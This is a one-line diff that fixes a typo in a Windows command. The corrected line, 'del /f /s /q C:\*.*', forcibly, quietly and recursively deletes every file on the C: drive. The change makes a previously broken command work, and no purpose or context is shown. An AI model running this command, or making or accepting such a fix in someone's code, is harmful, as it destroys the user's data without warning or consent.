@@ -1,1 +1,1 @@
-dell /f /s /q C:\*.*
+del /f /s /q C:\*.*
